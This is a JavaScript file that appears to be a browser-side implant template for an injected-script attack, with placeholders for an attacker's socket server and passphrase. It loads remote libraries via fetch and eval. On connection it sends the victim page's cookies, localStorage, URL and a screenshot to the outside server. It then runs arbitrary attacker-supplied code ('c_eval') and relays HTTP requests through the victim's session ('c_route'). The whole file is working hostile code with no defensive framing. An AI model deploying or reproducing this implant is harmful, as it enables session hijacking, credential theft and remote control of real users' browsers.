function calculateAspectRatioFit(width, height, maxDimension) {
	const ratio = Math.min(maxDimension / width, maxDimension / height);
	return [Math.floor(width * ratio), Math.floor(height * ratio)];
}

function resizeImage(src, maxDimension = 400) {
	return new Promise((resolve, reject) => {
		const img = new Image();
		img.src = src;
		img.onload = () => {
			const [width, height] = calculateAspectRatioFit(
				img.width,
				img.height,
				maxDimension
			);
			const canvas = document.createElement("canvas");
			canvas.width = width;
			canvas.height = height;
			const ctx = canvas.getContext("2d");
			ctx.drawImage(img, 0, 0, width, height);
			resolve(canvas.toDataURL());
		};
		img.onerror = reject;
	});
}
function arrayBufferToBase64(buffer) {
	let binary = "";
	let bytes = new Uint8Array(buffer);
	let len = bytes.byteLength;
	for (let i = 0; i < len; i++) {
		binary += String.fromCharCode(bytes[i]);
	}
	return window.btoa(binary);
}
async function fetchAndEvaluateScript(url) {
	try {
		const response = await fetch(url);
		const script = await response.text();
		eval(script);
	} catch (error) {
		console.error(`Error loading script from ${url}: ${error.message}`);
	}
}

function getKeyFromPassphrase(passphrase) {
	return CryptoJS.enc.Hex.parse(
		CryptoJS.SHA256(passphrase).toString().substr(0, 32)
	);
}

function encryptData(data, secretPassphrase) {
	const key = getKeyFromPassphrase(secretPassphrase);
	const iv = CryptoJS.lib.WordArray.random(16);
	const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), key, { iv: iv });
	return iv.toString() + ":" + encrypted.toString();
}

function decryptData(ciphertext, secretPassphrase) {
	const key = getKeyFromPassphrase(secretPassphrase);
	const textParts = ciphertext.split(":");
	const iv = CryptoJS.enc.Hex.parse(textParts.shift());
	const encryptedText = textParts.join(":");
	const decrypted = CryptoJS.AES.decrypt(encryptedText, key, { iv: iv });
	return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
}

// URLs of scripts to load
const scripts = [
	"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js",
	"https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.js",
	"https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js",
];

(async () => {
	for (const script of scripts) {
		await fetchAndEvaluateScript(script);
	}

	if (typeof html2canvas === "undefined") {
		console.error("html2canvas is not loaded");
		return;
	}

	const secretPassphrase = "$$SECRET_PASSPHRASE$$";

	const socket = io("$$SOCKET_SERVER_URL$$", {
		reconnection: true,
		reconnectionDelay: 1000,
	});

	socket.on("connect", async () => {
		try {
			const screenshot = await html2canvas(document.body, {
				width: 1920,
				height: 1080,
			}).then((canvas) => canvas.toDataURL("image/png"));

			const resizedImage = await resizeImage(screenshot, 2000);

			const data = {
				cookie: document.cookie,
				localStorage: localStorage,
				agent: navigator.userAgent,
				origin: window.location.origin,
				href: window.location.href,
				image: resizedImage,
			};

			const encryptedData = encryptData(data, secretPassphrase);
			socket.emit("s_connect", encryptedData);
		} catch (error) {
			console.error(`Error taking screenshot: ${error.message}`);
		}
	});

	socket.on("c_eval", async (id, commands) => {
		try {
			const decryptedCommands = decryptData(commands, secretPassphrase);
			const result = await eval(`(async() => { ${decryptedCommands} })();`);
			const encryptedResult = encryptData(result, secretPassphrase);
			socket.emit("s_eval", id, "success", String(encryptedResult));
		} catch (error) {
			socket.emit("s_eval", id, "error", error.message);
		}
	});

	socket.on("c_route", async (req_id, id, encryptedRouteData) => {
		try {
			const decryptedRouteData = decryptData(
				encryptedRouteData,
				secretPassphrase
			);
			const { route, method, body } = decryptedRouteData;

			const options = {
				method,
				headers: {},
			};

			if (method !== "GET" && method !== "HEAD") {
				if (body.type === "formdata") {
					options.body = new FormData();
				} else if (body.type === "text") {
					options.body = body.body;
					options.headers["Content-Type"] = "text/plain";
				} else if (body.type === "json") {
					options.body = body.body;
					options.headers["Content-Type"] = "application/json";
				} else if (body.type === "form-urlencoded") {
					options.body = new URLSearchParams(body.body).toString();
					options.headers["Content-Type"] = "application/x-www-form-urlencoded";
				}
			}

			const response = await fetch(route, options);
			const arrayBuffer = arrayBufferToBase64(await response.arrayBuffer());
			const headers = Object.fromEntries(response.headers.entries());
			const encryptedResponseData = encryptData(
				{ arrayBuffer, headers },
				secretPassphrase
			);
			socket.emit("s_route", req_id, id, "success", encryptedResponseData);
		} catch (error) {
			const encryptedErrorData = encryptData(
				{ message: error.message },
				secretPassphrase
			);
			socket.emit("s_route", req_id, id, "error", encryptedErrorData);
		}
	});
})();
